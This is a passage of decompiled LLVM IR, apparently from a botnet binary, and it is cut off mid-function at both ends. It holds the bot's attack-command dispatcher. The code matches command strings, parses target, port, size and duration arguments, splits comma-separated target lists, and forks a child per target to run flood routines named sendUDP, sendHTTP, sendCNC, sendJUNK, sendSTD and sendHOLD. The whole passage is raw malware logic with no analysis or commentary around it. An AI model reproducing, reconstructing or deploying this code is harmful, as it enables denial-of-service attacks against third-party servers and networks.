  %v0_11f74 = call i32 @listFork()
  %v2_11f7c = icmp eq i32 %v0_11f74, 0
  br i1 %v2_11f7c, label %dec_label_pc_11f84, label %dec_label_pc_12d5c

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f74
  %v4_11f90 = call i32 @sendJUNK(i32 %v2_11ea0, i32 %v1_11eb8, i32 %v1_11ed4, i32 0)
  %v1_11f98 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11f9c

dec_label_pc_11f9c:                               ; preds = %dec_label_pc_11f50, %dec_label_pc_11efc, %dec_label_pc_11e28, %dec_label_pc_11f84
  %v2_11fa0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_245b4.1240 to i32), i32* @r1, align 4
  %v3_11fac = inttoptr i32 %v2_11fa0 to i8*
  %v4_11fac = call i32 @__GI_strcoll(i8* %v3_11fac, i32 ptrtoint ([4 x i8]* @global_var_245b4.1240 to i32))
  %v2_11fb4 = icmp eq i32 %v4_11fac, 0
  br i1 %v2_11fb4, label %dec_label_pc_11fbc, label %dec_label_pc_1224c

dec_label_pc_11fbc:                               ; preds = %dec_label_pc_11f9c
  %v7_11fc4 = icmp slt i32 %arg1, 6
  br i1 %v7_11fc4, label %dec_label_pc_12d5c, label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %dec_label_pc_11fbc
  %v1_11fcc = add i32 %tmp, 12
  %v1_11fd0 = inttoptr i32 %v1_11fcc to i32*
  %v2_11fd0 = load i32, i32* %v1_11fd0, align 4
  store i32 %v2_11fd0, i32* @r0, align 4
  %v1_11fd8 = call i32 @atol(i32 %v2_11fd0)
  %v7_11fe0 = icmp eq i32 %v1_11fd8, -1
  br i1 %v7_11fe0, label %dec_label_pc_12d5c, label %dec_label_pc_11fe8

dec_label_pc_11fe8:                               ; preds = %dec_label_pc_11fc8
  %v1_11fec = add i32 %tmp, 8
  %v1_11ff0 = inttoptr i32 %v1_11fec to i32*
  %v2_11ff0 = load i32, i32* %v1_11ff0, align 4
  store i32 %v2_11ff0, i32* @r0, align 4
  %v1_11ff8 = call i32 @atol(i32 %v2_11ff0)
  %v7_12000 = icmp eq i32 %v1_11ff8, -1
  br i1 %v7_12000, label %dec_label_pc_12d5c, label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %dec_label_pc_11fe8
  %v1_1200c = add i32 %tmp, 16
  %v1_12010 = inttoptr i32 %v1_1200c to i32*
  %v2_12010 = load i32, i32* %v1_12010, align 4
  store i32 %v2_12010, i32* @r0, align 4
  %v1_12018 = call i32 @atol(i32 %v2_12010)
  %v7_12020 = icmp eq i32 %v1_12018, -1
  br i1 %v7_12020, label %dec_label_pc_12d5c, label %dec_label_pc_12028

dec_label_pc_12028:                               ; preds = %dec_label_pc_12008
  %v1_1202c = add i32 %tmp, 20
  %v1_12030 = inttoptr i32 %v1_1202c to i32*
  %v2_12030 = load i32, i32* %v1_12030, align 4
  store i32 %v2_12030, i32* @r0, align 4
  %v1_12038 = call i32 @atol(i32 %v2_12030)
  %v7_12040 = icmp eq i32 %v1_12038, -1
  br i1 %v7_12040, label %dec_label_pc_12d5c, label %dec_label_pc_12048

dec_label_pc_12048:                               ; preds = %dec_label_pc_12028
  %v2_12050 = load i32, i32* %v1_12030, align 4
  store i32 %v2_12050, i32* @r0, align 4
  %v1_12058 = call i32 @atol(i32 %v2_12050)
  %v8_1206c = icmp sgt i32 %v1_12058, add (i32 ptrtoint (i32* @global_var_ff00.40 to i32), i32 220)
  br i1 %v8_1206c, label %dec_label_pc_12d5c, label %dec_label_pc_12070

dec_label_pc_12070:                               ; preds = %dec_label_pc_12048
  %v2_12078 = load i32, i32* %v1_12010, align 4
  store i32 %v2_12078, i32* @r0, align 4
  %v1_12080 = call i32 @atol(i32 %v2_12078)
  %v8_1208c = icmp sgt i32 %v1_12080, 32
  br i1 %v8_1208c, label %dec_label_pc_12d5c, label %dec_label_pc_12090

dec_label_pc_12090:                               ; preds = %dec_label_pc_12070
  %v7_12094 = icmp eq i32 %arg1, 7
  br i1 %v7_12094, label %dec_label_pc_1209c, label %dec_label_pc_120c0

dec_label_pc_1209c:                               ; preds = %dec_label_pc_12090
  %v1_120a0 = add i32 %tmp, 24
  %v1_120a4 = inttoptr i32 %v1_120a0 to i32*
  %v2_120a4 = load i32, i32* %v1_120a4, align 4
  store i32 %v2_120a4, i32* @r0, align 4
  %v1_120ac = call i32 @atol(i32 %v2_120a4)
  %v5_120b8 = icmp sgt i32 %v1_120ac, 0
  br i1 %v5_120b8, label %dec_label_pc_120c0, label %dec_label_pc_12d5c

dec_label_pc_120c0:                               ; preds = %dec_label_pc_12090, %dec_label_pc_1209c
  %v1_120c4 = add i32 %tmp, 4
  %v1_120c8 = inttoptr i32 %v1_120c4 to i32*
  %v2_120c8 = load i32, i32* %v1_120c8, align 4
  %v2_120d8 = load i32, i32* %v1_11ff0, align 4
  store i32 %v2_120d8, i32* @r0, align 4
  %v1_120e0 = call i32 @atol(i32 %v2_120d8)
  %v2_120f4 = load i32, i32* %v1_11fd0, align 4
  store i32 %v2_120f4, i32* @r0, align 4
  %v1_120fc = call i32 @atol(i32 %v2_120f4)
  %v2_12110 = load i32, i32* %v1_12010, align 4
  store i32 %v2_12110, i32* @r0, align 4
  %v1_12118 = call i32 @atol(i32 %v2_12110)
  %v2_1212c = load i32, i32* %v1_12030, align 4
  store i32 %v2_1212c, i32* @r0, align 4
  %v1_12134 = call i32 @atol(i32 %v2_1212c)
  br i1 %v7_12094, label %dec_label_pc_1214c, label %dec_label_pc_12168

dec_label_pc_1214c:                               ; preds = %dec_label_pc_120c0
  %v1_12150 = add i32 %tmp, 24
  %v1_12154 = inttoptr i32 %v1_12150 to i32*
  %v2_12154 = load i32, i32* %v1_12154, align 4
  store i32 %v2_12154, i32* @r0, align 4
  %v1_1215c = call i32 @atol(i32 %v2_12154)
  br label %dec_label_pc_12170

dec_label_pc_12168:                               ; preds = %dec_label_pc_120c0
  br label %dec_label_pc_12170

dec_label_pc_12170:                               ; preds = %dec_label_pc_1214c, %dec_label_pc_12168
  %storemerge9 = phi i32 [ 10, %dec_label_pc_12168 ], [ %v1_1215c, %dec_label_pc_1214c ]
  store i32 %v2_120c8, i32* @r0, align 4
  %v2_12184 = call i32 @__GI_strchr(i32 %v2_120c8, i32 44)
  store i32 %v2_12184, i32* @r0, align 4
  %v2_1218c = icmp eq i32 %v2_12184, 0
  br i1 %v2_1218c, label %dec_label_pc_12210, label %dec_label_pc_12194

dec_label_pc_12194:                               ; preds = %dec_label_pc_12170
  %v2_121a0 = call i32 @__GI_strtok(i32 %v2_120c8, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_121a0, i32* @r0, align 4
  %v2_1220444 = icmp eq i32 %v2_121a0, 0
  br i1 %v2_1220444, label %dec_label_pc_1224c, label %dec_label_pc_121b0

dec_label_pc_121b0:                               ; preds = %dec_label_pc_12194, %dec_label_pc_121ec
  %storemerge2445 = phi i32 [ %v2_121f4, %dec_label_pc_121ec ], [ %v2_121a0, %dec_label_pc_12194 ]
  %v0_121b0 = call i32 @listFork()
  %v2_121b8 = icmp eq i32 %v0_121b0, 0
  br i1 %v2_121b8, label %dec_label_pc_121c0, label %dec_label_pc_121ec

dec_label_pc_121c0:                               ; preds = %dec_label_pc_121b0
  %v6_121e0 = call i32 @sendUDP(i32 %storemerge2445, i32 %v1_120e0, i32 %v1_120fc, i32 %v1_12118, i32 %v1_12134, i32 %storemerge9)
  %v1_121e8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_121ec

dec_label_pc_121ec:                               ; preds = %dec_label_pc_121b0, %dec_label_pc_121c0
  %v2_121f4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_121f4, i32* @r0, align 4
  %v2_12204 = icmp eq i32 %v2_121f4, 0
  br i1 %v2_12204, label %dec_label_pc_1224c, label %dec_label_pc_121b0

dec_label_pc_12210:                               ; preds = %dec_label_pc_12170
  %v0_12210 = call i32 @listFork()
  %v2_12218 = icmp eq i32 %v0_12210, 0
  br i1 %v2_12218, label %dec_label_pc_12220, label %dec_label_pc_12d5c

dec_label_pc_12220:                               ; preds = %dec_label_pc_12210
  %v6_12240 = call i32 @sendUDP(i32 %v2_120c8, i32 %v1_120e0, i32 %v1_120fc, i32 %v1_12118, i32 %v1_12134, i32 %storemerge9)
  %v1_12248 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1224c

dec_label_pc_1224c:                               ; preds = %dec_label_pc_121ec, %dec_label_pc_12194, %dec_label_pc_11f9c, %dec_label_pc_12220
  %v2_12250 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_245b8.1242 to i32), i32* @r1, align 4
  %v3_1225c = inttoptr i32 %v2_12250 to i8*
  %v4_1225c = call i32 @__GI_strcoll(i8* %v3_1225c, i32 ptrtoint ([5 x i8]* @global_var_245b8.1242 to i32))
  %v2_12264 = icmp eq i32 %v4_1225c, 0
  br i1 %v2_12264, label %dec_label_pc_1226c, label %dec_label_pc_12444

dec_label_pc_1226c:                               ; preds = %dec_label_pc_1224c
  %v7_12274 = icmp slt i32 %arg1, 6
  br i1 %v7_12274, label %dec_label_pc_12d5c, label %dec_label_pc_12278

dec_label_pc_12278:                               ; preds = %dec_label_pc_1226c
  %v1_1227c = add i32 %tmp, 4
  %v1_12280 = inttoptr i32 %v1_1227c to i32*
  %v2_12280 = load i32, i32* %v1_12280, align 4
  store i32 %v2_12280, i32* @r0, align 4
  %v2_1228c = call i32 @__GI_strchr(i32 %v2_12280, i32 44)
  store i32 %v2_1228c, i32* @r0, align 4
  %v2_12294 = icmp eq i32 %v2_1228c, 0
  br i1 %v2_12294, label %dec_label_pc_12394, label %dec_label_pc_1229c

dec_label_pc_1229c:                               ; preds = %dec_label_pc_12278
  %v2_122a4 = load i32, i32* %v1_12280, align 4
  %v2_122b0 = call i32 @__GI_strtok(i32 %v2_122a4, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_122b0, i32* @r0, align 4
  %v2_1238842 = icmp eq i32 %v2_122b0, 0
  br i1 %v2_1238842, label %dec_label_pc_12444, label %dec_label_pc_122c0.lr.ph

dec_label_pc_122c0.lr.ph:                         ; preds = %dec_label_pc_1229c
  %v1_122e0 = add i32 %tmp, 8
  %v1_122e4 = inttoptr i32 %v1_122e0 to i32*
  %v1_122f0 = add i32 %tmp, 12
  %v1_122f4 = inttoptr i32 %v1_122f0 to i32*
  %v1_12310 = add i32 %tmp, 16
  %v1_12314 = inttoptr i32 %v1_12310 to i32*
  %v1_12320 = add i32 %tmp, 20
  %v1_12324 = inttoptr i32 %v1_12320 to i32*
  %v1_12338 = add i32 %tmp, 24
  %v1_1233c = inttoptr i32 %v1_12338 to i32*
  br label %dec_label_pc_122c0

dec_label_pc_122c0:                               ; preds = %dec_label_pc_122c0.lr.ph, %dec_label_pc_12370
  %v0_122c0 = call i32 @listFork()
  %v2_122c8 = icmp eq i32 %v0_122c0, 0
  br i1 %v2_122c8, label %dec_label_pc_122d0, label %dec_label_pc_12370

dec_label_pc_122d0:                               ; preds = %dec_label_pc_122c0
  %v2_122d8 = load i32, i32* %v1_12280, align 4
  store i32 %v2_122d8, i32* @r5, align 4
  %v2_122e4 = load i32, i32* %v1_122e4, align 4
  store i32 %v2_122e4, i32* @r6, align 4
  %v2_122f4 = load i32, i32* %v1_122f4, align 4
  store i32 %v2_122f4, i32* @r0, align 4
  %v1_122fc = call i32 @atol(i32 %v2_122f4)
  %v3_12308 = urem i32 %v1_122fc, 65536
  store i32 %v3_12308, i32* @r7, align 4
  %v2_12314 = load i32, i32* %v1_12314, align 4
  store i32 %v2_12314, i32* @r8, align 4
  %v2_12324 = load i32, i32* %v1_12324, align 4
  store i32 %v2_12324, i32* @r0, align 4
  %v1_1232c = call i32 @atol(i32 %v2_12324)
  store i32 %v1_1232c, i32* @r4, align 4
  %v2_1233c = load i32, i32* %v1_1233c, align 4
  store i32 %v2_1233c, i32* @r0, align 4
  %v1_12344 = call i32 @atol(i32 %v2_1233c)
  %v0_1234c = load i32, i32* @r4, align 4
  %v0_12354 = load i32, i32* @r5, align 4
  %v0_12358 = load i32, i32* @r6, align 4
  %v0_1235c = load i32, i32* @r7, align 4
  %v0_12360 = load i32, i32* @r8, align 4
  %v6_12364 = trunc i32 %v0_1235c to i16
  %v7_12364 = call i32 @sendHTTP(i32 %v0_12354, i32 %v0_12358, i16 %v6_12364, i32 %v0_12360, i32 %v0_1234c, i32 %v1_12344)
  %v1_1236c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12370

dec_label_pc_12370:                               ; preds = %dec_label_pc_122c0, %dec_label_pc_122d0
  %v2_12378 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_12378, i32* @r0, align 4
  %v2_12388 = icmp eq i32 %v2_12378, 0
  br i1 %v2_12388, label %dec_label_pc_12444, label %dec_label_pc_122c0

dec_label_pc_12394:                               ; preds = %dec_label_pc_12278
  %v0_12394 = call i32 @listFork()
  %v2_1239c = icmp eq i32 %v0_12394, 0
  br i1 %v2_1239c, label %dec_label_pc_123a4, label %dec_label_pc_12d5c

dec_label_pc_123a4:                               ; preds = %dec_label_pc_12394
  %v2_123ac = load i32, i32* %v1_12280, align 4
  store i32 %v2_123ac, i32* @r5, align 4
  %v1_123b4 = add i32 %tmp, 8
  %v1_123b8 = inttoptr i32 %v1_123b4 to i32*
  %v2_123b8 = load i32, i32* %v1_123b8, align 4
  store i32 %v2_123b8, i32* @r6, align 4
  %v1_123c4 = add i32 %tmp, 12
  %v1_123c8 = inttoptr i32 %v1_123c4 to i32*
  %v2_123c8 = load i32, i32* %v1_123c8, align 4
  store i32 %v2_123c8, i32* @r0, align 4
  %v1_123d0 = call i32 @atol(i32 %v2_123c8)
  %v3_123dc = urem i32 %v1_123d0, 65536
  store i32 %v3_123dc, i32* @r7, align 4
  %v1_123e4 = add i32 %tmp, 16
  %v1_123e8 = inttoptr i32 %v1_123e4 to i32*
  %v2_123e8 = load i32, i32* %v1_123e8, align 4
  store i32 %v2_123e8, i32* @r8, align 4
  %v1_123f4 = add i32 %tmp, 20
  %v1_123f8 = inttoptr i32 %v1_123f4 to i32*
  %v2_123f8 = load i32, i32* %v1_123f8, align 4
  store i32 %v2_123f8, i32* @r0, align 4
  %v1_12400 = call i32 @atol(i32 %v2_123f8)
  store i32 %v1_12400, i32* @r4, align 4
  %v1_1240c = add i32 %tmp, 24
  %v1_12410 = inttoptr i32 %v1_1240c to i32*
  %v2_12410 = load i32, i32* %v1_12410, align 4
  store i32 %v2_12410, i32* @r0, align 4
  %v1_12418 = call i32 @atol(i32 %v2_12410)
  %v0_12420 = load i32, i32* @r4, align 4
  %v0_12428 = load i32, i32* @r5, align 4
  %v0_1242c = load i32, i32* @r6, align 4
  %v0_12430 = load i32, i32* @r7, align 4
  %v0_12434 = load i32, i32* @r8, align 4
  %v6_12438 = trunc i32 %v0_12430 to i16
  %v7_12438 = call i32 @sendHTTP(i32 %v0_12428, i32 %v0_1242c, i16 %v6_12438, i32 %v0_12434, i32 %v0_12420, i32 %v1_12418)
  %v1_12440 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12444

dec_label_pc_12444:                               ; preds = %dec_label_pc_12370, %dec_label_pc_1229c, %dec_label_pc_1224c, %dec_label_pc_123a4
  %v2_12448 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_245c0.1244 to i32), i32* @r1, align 4
  %v3_12454 = inttoptr i32 %v2_12448 to i8*
  %v4_12454 = call i32 @__GI_strcoll(i8* %v3_12454, i32 ptrtoint ([4 x i8]* @global_var_245c0.1244 to i32))
  %v2_1245c = icmp eq i32 %v4_12454, 0
  br i1 %v2_1245c, label %dec_label_pc_12464, label %dec_label_pc_125b8

dec_label_pc_12464:                               ; preds = %dec_label_pc_12444
  %v7_1246c = icmp slt i32 %arg1, 4
  br i1 %v7_1246c, label %dec_label_pc_12d5c, label %dec_label_pc_12470

dec_label_pc_12470:                               ; preds = %dec_label_pc_12464
  %v1_12474 = add i32 %tmp, 8
  %v1_12478 = inttoptr i32 %v1_12474 to i32*
  %v2_12478 = load i32, i32* %v1_12478, align 4
  store i32 %v2_12478, i32* @r0, align 4
  %v1_12480 = call i32 @atol(i32 %v2_12478)
  %tmp116 = icmp slt i32 %v1_12480, 1
  br i1 %tmp116, label %dec_label_pc_12d5c, label %dec_label_pc_12490

dec_label_pc_12490:                               ; preds = %dec_label_pc_12470
  %v1_12494 = add i32 %tmp, 12
  %v1_12498 = inttoptr i32 %v1_12494 to i32*
  %v2_12498 = load i32, i32* %v1_12498, align 4
  store i32 %v2_12498, i32* @r0, align 4
  %v1_124a0 = call i32 @atol(i32 %v2_12498)
  %v5_124ac = icmp sgt i32 %v1_124a0, 0
  br i1 %v5_124ac, label %dec_label_pc_124b4, label %dec_label_pc_12d5c

dec_label_pc_124b4:                               ; preds = %dec_label_pc_12490
  %v1_124b8 = add i32 %tmp, 4
  %v1_124bc = inttoptr i32 %v1_124b8 to i32*
  %v2_124bc = load i32, i32* %v1_124bc, align 4
  %v2_124cc = load i32, i32* %v1_12478, align 4
  store i32 %v2_124cc, i32* @r0, align 4
  %v1_124d4 = call i32 @atol(i32 %v2_124cc)
  %v2_124e8 = load i32, i32* %v1_12498, align 4
  store i32 %v2_124e8, i32* @r0, align 4
  %v1_124f0 = call i32 @atol(i32 %v2_124e8)
  store i32 %v2_124bc, i32* @r0, align 4
  %v2_12508 = call i32 @__GI_strchr(i32 %v2_124bc, i32 44)
  store i32 %v2_12508, i32* @r0, align 4
  %v2_12510 = icmp eq i32 %v2_12508, 0
  br i1 %v2_12510, label %dec_label_pc_12590, label %dec_label_pc_12518

dec_label_pc_12518:                               ; preds = %dec_label_pc_124b4
  %v2_12524 = call i32 @__GI_strtok(i32 %v2_124bc, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_12524, i32* @r0, align 4
  %v2_1258439 = icmp eq i32 %v2_12524, 0
  br i1 %v2_1258439, label %dec_label_pc_125b8, label %dec_label_pc_12534

dec_label_pc_12534:                               ; preds = %dec_label_pc_12518, %dec_label_pc_1256c
  %storemerge2040 = phi i32 [ %v2_12574, %dec_label_pc_1256c ], [ %v2_12524, %dec_label_pc_12518 ]
  %v0_12534 = call i32 @listFork()
  %v2_1253c = icmp eq i32 %v0_12534, 0
  br i1 %v2_1253c, label %dec_label_pc_12544, label %dec_label_pc_1256c

dec_label_pc_12544:                               ; preds = %dec_label_pc_12534
  %v4_12550 = call i32 @sendCNC(i32 %storemerge2040, i32 %v1_124d4, i32 %v1_124f0, i32 0)
  %v2_12558 = load i32, i32* @global_var_2e4e0.53, align 4
  %v1_12560 = call i32 @__GI_close(i32 %v2_12558)
  %v1_12568 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1256c

dec_label_pc_1256c:                               ; preds = %dec_label_pc_12534, %dec_label_pc_12544
  %v2_12574 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_12574, i32* @r0, align 4
  %v2_12584 = icmp eq i32 %v2_12574, 0
  br i1 %v2_12584, label %dec_label_pc_125b8, label %dec_label_pc_12534

dec_label_pc_12590:                               ; preds = %dec_label_pc_124b4
  %v0_12590 = call i32 @listFork()
  %v2_12598 = icmp eq i32 %v0_12590, 0
  br i1 %v2_12598, label %dec_label_pc_125a0, label %dec_label_pc_12d5c

dec_label_pc_125a0:                               ; preds = %dec_label_pc_12590
  %v4_125ac = call i32 @sendCNC(i32 %v2_124bc, i32 %v1_124d4, i32 %v1_124f0, i32 0)
  %v1_125b4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_125b8

dec_label_pc_125b8:                               ; preds = %dec_label_pc_1256c, %dec_label_pc_12518, %dec_label_pc_12444, %dec_label_pc_125a0
  %v2_125bc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_245c4.1246 to i32), i32* @r1, align 4
  %v3_125c8 = inttoptr i32 %v2_125bc to i8*
  %v4_125c8 = call i32 @__GI_strcoll(i8* %v3_125c8, i32 ptrtoint ([6 x i8]* @global_var_245c4.1246 to i32))
  %v2_125d0 = icmp eq i32 %v4_125c8, 0
  br i1 %v2_125d0, label %dec_label_pc_125d8, label %dec_label_pc_1276c

dec_label_pc_125d8:                               ; preds = %dec_label_pc_125b8
  %v7_125e0 = icmp slt i32 %arg1, 4
  br i1 %v7_125e0, label %dec_label_pc_12d5c, label %dec_label_pc_125e4

dec_label_pc_125e4:                               ; preds = %dec_label_pc_125d8
  %v1_125e8 = add i32 %tmp, 8
  %v1_125ec = inttoptr i32 %v1_125e8 to i32*
  %v2_125ec = load i32, i32* %v1_125ec, align 4
  store i32 %v2_125ec, i32* @r0, align 4
  %v1_125f4 = call i32 @atol(i32 %v2_125ec)
  %tmp117 = icmp slt i32 %v1_125f4, 1
  br i1 %tmp117, label %dec_label_pc_12d5c, label %dec_label_pc_12604

dec_label_pc_12604:                               ; preds = %dec_label_pc_125e4
  %v1_12608 = add i32 %tmp, 12
  %v1_1260c = inttoptr i32 %v1_12608 to i32*
  %v2_1260c = load i32, i32* %v1_1260c, align 4
  store i32 %v2_1260c, i32* @r0, align 4
  %v1_12614 = call i32 @atol(i32 %v2_1260c)
  %v5_12620 = icmp sgt i32 %v1_12614, 0
  br i1 %v5_12620, label %dec_label_pc_12628, label %dec_label_pc_12d5c

dec_label_pc_12628:                               ; preds = %dec_label_pc_12604
  %v1_1262c = add i32 %tmp, 4
  %v1_12630 = inttoptr i32 %v1_1262c to i32*
  %v2_12630 = load i32, i32* %v1_12630, align 4
  %v2_12640 = load i32, i32* %v1_125ec, align 4
  store i32 %v2_12640, i32* @r0, align 4
  %v1_12648 = call i32 @atol(i32 %v2_12640)
  %v2_1265c = load i32, i32* %v1_1260c, align 4
  store i32 %v2_1265c, i32* @r0, align 4
  %v1_12664 = call i32 @atol(i32 %v2_1265c)
  store i32 %v2_12630, i32* @r0, align 4
  %v2_1267c = call i32 @__GI_strchr(i32 %v2_12630, i32 44)
  store i32 %v2_1267c, i32* @r0, align 4
  %v2_12684 = icmp eq i32 %v2_1267c, 0
  br i1 %v2_12684, label %dec_label_pc_12724, label %dec_label_pc_1268c

dec_label_pc_1268c:                               ; preds = %dec_label_pc_12628
  %v2_12698 = call i32 @__GI_strtok(i32 %v2_12630, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_12698, i32* @r0, align 4
  %v2_1271836 = icmp eq i32 %v2_12698, 0
  br i1 %v2_1271836, label %dec_label_pc_1276c, label %dec_label_pc_126a8

dec_label_pc_126a8:                               ; preds = %dec_label_pc_1268c, %dec_label_pc_12700
  %storemerge1837 = phi i32 [ %v2_12708, %dec_label_pc_12700 ], [ %v2_12698, %dec_label_pc_1268c ]
  %v0_126a8 = call i32 @listFork()
  %v2_126b0 = icmp eq i32 %v0_126a8, 0
  br i1 %v2_126b0, label %dec_label_pc_126b8, label %dec_label_pc_12700

dec_label_pc_126b8:                               ; preds = %dec_label_pc_126a8
  %v4_126c4 = call i32 @sendJUNK(i32 %storemerge1837, i32 %v1_12648, i32 %v1_12664, i32 0)
  %v3_126d4 = call i32 @sendSTD(i32 %storemerge1837, i32 %v1_12648, i32 %v1_12664)
  %v3_126e4 = call i32 @sendHOLD(i32 %storemerge1837, i32 %v1_12648, i32 %v1_12664)
  %v2_126ec = load i32, i32* @global_var_2e4e0.53, align 4
  %v1_126f4 = call i32 @__GI_close(i32 %v2_126ec)
  %v1_126fc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12700

dec_label_pc_12700:                               ; preds = %dec_label_pc_126a8, %dec_label_pc_126b8
  %v2_12708 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_12708, i32* @r0, align 4
  %v2_12718 = icmp eq i32 %v2_12708, 0
  br i1 %v2_12718, label %dec_label_pc_1276c, label %dec_label_pc_126a8

dec_label_pc_12724:                               ; preds = %dec_label_pc_12628
  %v0_12724 = call i32 @listFork()
  %v2_1272c = icmp eq i32 %v0_12724, 0
  br i1 %v2_1272c, label %dec_label_pc_12734, label %dec_label_pc_12d5c

dec_label_pc_12734:                               ; preds = %dec_label_pc_12724
  %v4_12740 = call i32 @sendJUNK(i32 %v2_12630, i32 %v1_12648, i32 %v1_12664, i32 0)
  %v3_12750 = call i32 @sendSTD(i32 %v2_12630, i32 %v1_12648, i32 %v1_12664)
  %v3_12760 = call i32 @sendHOLD(i32 %v2_12630, i32 %v1_12648, i32 %v1_12664)
  %v1_12768 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1276c

dec_label_pc_1276c:                               ; preds = %dec_label_pc_12700, %dec_label_pc_1268c, %dec_label_pc_125b8, %dec_label_pc_12734
  %v2_12770 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_245cc.1248 to i32), i32* @r1, align 4
  %v3_1277c = inttoptr i32 %v2_12770 to i8*
  %v4_1277c = call i32 @__GI_strcoll(i8* %v3_1277c, i32 ptrtoint ([4 x i8]* @global_var_245cc.1248 to i32))
  %v2_12784 = icmp eq i32 %v4_1277c, 0
  br i1 %v2_12784, label %dec_label_pc_1278c, label %dec_label_pc_128d0

dec_label_pc_1278c:                               ; preds = %dec_label_pc_1276c
  %v7_12794 = icmp slt i32 %arg1, 4
  br i1 %v7_12794, label %dec_label_pc_12d5c, label %dec_label_pc_12798

dec_label_pc_12798:                               ; preds = %dec_label_pc_1278c
  %v1_1279c = add i32 %tmp, 8
  %v1_127a0 = inttoptr i32 %v1_1279c to i32*
  %v2_127a0 = load i32, i32* %v1_127a0, align 4
  store i32 %v2_127a0, i32* @r0, align 4
  %v1_127a8 = call i32 @atol(i32 %v2_127a0)
  %tmp118 = icmp slt i32 %v1_127a8, 1
  br i1 %tmp118, label %dec_label_pc_12d5c, label %dec_label_pc_127b8

dec_label_pc_127b8:                               ; preds = %dec_label_pc_12798
  %v1_127bc = add i32 %tmp, 12
  %v1_127c0 = inttoptr i32 %v1_127bc to i32*
  %v2_127c0 = load i32, i32* %v1_127c0, align 4
  store i32 %v2_127c0, i32* @r0, align 4
  %v1_127c8 = call i32 @atol(i32 %v2_127c0)
  %v5_127d4 = icmp sgt i32 %v1_127c8, 0
  br i1 %v5_127d4, label %dec_label_pc_127dc, label %dec_label_pc_12d5c

dec_label_pc_127dc:                               ; preds = %dec_label_pc_127b8
  %v1_127e0 = add i32 %tmp, 4
  %v1_127e4 = inttoptr i32 %v1_127e0 to i32*
  %v2_127e4 = load i32, i32* %v1_127e4, align 4
  %v2_127f4 = load i32, i32* %v1_127a0, align 4
  store i32 %v2_127f4, i32* @r0, align 4
  %v1_127fc = call i32 @atol(i32 %v2_127f4)
  %v2_12810 = load i32, i32* %v1_127c0, align 4
  store i32 %v2_12810, i32* @r0, align 4
  %v1_12818 = call i32 @atol(i32 %v2_12810)
  store i32 %v2_127e4, i32* @r0, align 4
  %v2_12830 = call i32 @__GI_strchr(i32 %v2_127e4, i32 44)
  store i32 %v2_12830, i32* @r0, align 4
  %v2_12838 = icmp eq i32 %v2_12830, 0
  br i1 %v2_12838, label %dec_label_pc_128a8, label %dec_label_pc_12840

dec_label_pc_12840:                               ; preds = %dec_label_pc_127dc
  %v2_1284c = call i32 @__GI_strtok(i32 %v2_127e4, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_1284c, i32* @r0, align 4
  %v2_1289c33 = icmp eq i32 %v2_1284c, 0
  br i1 %v2_1289c33, label %dec_label_pc_128d0, label %dec_label_pc_1285c

dec_label_pc_1285c:                               ; preds = %dec_label_pc_12840, %dec_label_pc_12884
  %storemerge1634 = phi i32 [ %v2_1288c, %dec_label_pc_12884 ], [ %v2_1284c, %dec_label_pc_12840 ]
  %v0_1285c = call i32 @listFork()
  %v2_12864 = icmp eq i32 %v0_1285c, 0
  br i1 %v2_12864, label %dec_label_pc_1286c, label %dec_label_pc_12884

dec_label_pc_1286c:                               ; preds = %dec_label_pc_1285c
  %v3_12878 = call i32 @sendSTD(i32 %storemerge1634, i32 %v1_127fc, i32 %v1_12818)
  %v1_12880 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %dec_label_pc_1285c, %dec_label_pc_1286c
  %v2_1288c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_1288c, i32* @r0, align 4
  %v2_1289c = icmp eq i32 %v2_1288c, 0
  br i1 %v2_1289c, label %dec_label_pc_128d0, label %dec_label_pc_1285c

dec_label_pc_128a8:                               ; preds = %dec_label_pc_127dc
  %v0_128a8 = call i32 @listFork()
  %v2_128b0 = icmp eq i32 %v0_128a8, 0
  br i1 %v2_128b0, label %dec_label_pc_128b8, label %dec_label_pc_12d5c

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128a8
  %v3_128c4 = call i32 @sendSTD(i32 %v2_127e4, i32 %v1_127fc, i32 %v1_12818)
  %v1_128cc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_128d0

dec_label_pc_128d0:                               ; preds = %dec_label_pc_12884, %dec_label_pc_12840, %dec_label_pc_1276c, %dec_label_pc_128b8
  %v2_128d4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_245d0.1250 to i32), i32* @r1, align 4
  %v3_128e0 = inttoptr i32 %v2_128d4 to i8*
